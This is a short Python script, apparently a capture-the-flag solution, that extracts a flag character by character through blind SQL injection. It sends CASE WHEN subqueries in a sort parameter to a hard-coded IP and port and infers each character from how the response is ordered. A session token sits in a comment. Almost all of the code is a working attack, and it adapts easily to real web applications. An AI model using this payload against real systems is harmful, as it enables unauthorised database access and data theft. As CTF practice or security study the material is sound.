import requests

def brute_force_flag(session):
    flag = ""
    keyword='1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM\{\}_'
    base_url = "http://103.77.175.40:8211/sort"
    #session = 'eyJ1c2VyX3Nlc3Npb24iOiIzMmRjZjgwNC0zYmM3LTQ4NzQtYWNmOS1kODg1NDM0ZjFhZDAifQ.aZgnAA.f-ZVLSmvZRH5OSW7I_z95n7juL0'
    for i in range(1,136):
        for j in keyword:
            param = f"(SELECT CASE WHEN ((SELECT SUBSTR(flag,{i},1) FROM flag42123) = '{j}') THEN date ELSE title END)"
            r = requests.get(url=base_url, cookies={"session":session}, params = {"key":param})
            
            first = r.text.find('0001-01-01')
            second = r.text.find('0001-03-01')
            if (first < second):
                flag += j
                print(flag)    
                break
        else:
            print('No character found')
            break
        
if __name__ == '__main__':
    session = input()
    brute_force_flag(session)
        